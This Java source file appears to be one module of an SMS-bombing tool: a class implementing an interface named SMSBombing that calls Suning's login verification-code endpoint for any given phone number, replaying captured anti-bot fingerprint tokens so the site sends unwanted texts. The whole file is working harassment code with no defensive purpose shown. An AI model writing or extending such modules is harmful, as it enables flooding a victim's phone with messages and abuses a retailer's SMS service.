package zzq.sms.service.impl;

import cn.hutool.http.HttpRequest;
import zzq.sms.service.SMSBombing;


/**
 * 苏宁易购
 */
public class SuNingYiPurchase implements SMSBombing {
    @Override
    public void sendSms(String phone) {
        sendLoginSms(phone);
    }

    /**
     * 登录短信验证码
     * @param phone
     */
    private void sendLoginSms(String phone) {
        String body = HttpRequest.get("https://reg.suning.com/smsLogin/sendSms.do?callback=smsLoginSendSms&phoneNumber="+phone+"&rememberMe=true&type=0&sceneId=logonImg&targetUrl=https%3A%2F%2Fwww.suning.com%2F%3Futm_source%3Dbaidu%26utm_medium%3Dbrand%26utm_campaign%3Dtitle&detect=mmds_ogkGClooogkAC_oooMkHC7ooojkLCloooYkBC27oooYkzCuoooskgCuooosksC7oooEkdCuooodkOC2uooodk0C_oooQkSC7oooqkPClooo0k2wAooo0kfwoACoo0kDwmKyFmRC_xOLyMjQD7-BVWameCCyfyRf4r4lm_Ofo82t2ooooDooI2o2ooo8fooI2t2oooUCooL2vooooLCooz2voooorCooX2Ooooo9fooX2t2ooo4fooL20ooootDoo82o2oooIfooL2t2ooomo2fDCw15thmmkffm4lKrmrm4fRffLKfK4Rr4m4lKrmD9ooF68f_Xoojuo1tH2o~FpDpt2oqk~C5K7o1-toB7oo0kfwmFlFFRYYKCLjlSCyjffCkRKLCkWr9kSYkRWk4m4mEVoooooo8Xoo5foooooowfooy~oooooooQooq~2oooooA52oOJoooooovGootooooooo2JooF0_oooooGooom4fKm4r4rmm44LfLyLfR44rfrmrm4F7oVhWkiooo6hdFrooo~tGFJoooUthFLcDo1tn2Cuooo.t727ooojth2uooo2hf2uooo6hSo_oooUhqo27oooBhQoloooxhQoB2oo8hQo_ooogh~o_oooQhYoouoooPhNouoootTBo_oooGTLouoooXTno7ooojTWo2_oooQTuolooo4TKo_ooo3T-o_ooopTTouoooVTtoo_ooof-1o_oooD-Couooow-DolDoo1-woHooo1-tooCDoo1-to_Doo5-honoook-6o_ooo7-Holooo.-No27ooor-qo_oooM-K2loooO-927ooop-Y2uoooDFV2fuoooTFkf_ooolFRf7oooWFBflooocFgf7oooRFdfDuoooaFSfuooo9FPf_oooLFoD_oooxF1DuooogFFD27ooojFlD_oooQFWDuooo4FcD_oooPFnDuooookUDo_ooo1kBDuoooukYD7ooo.kPDuoooBktC_ooo8klC2_LrykFlRFLfoo_._dad10f8f-6aca-49b4-8dad-e08f3dc79c9f_._&dfpToken=TH4qFF16ed56977ea2bR25236&terminal=PC&createChannel=208000103001&_=1575538581746")
                .execute()
                .body();
    }


}
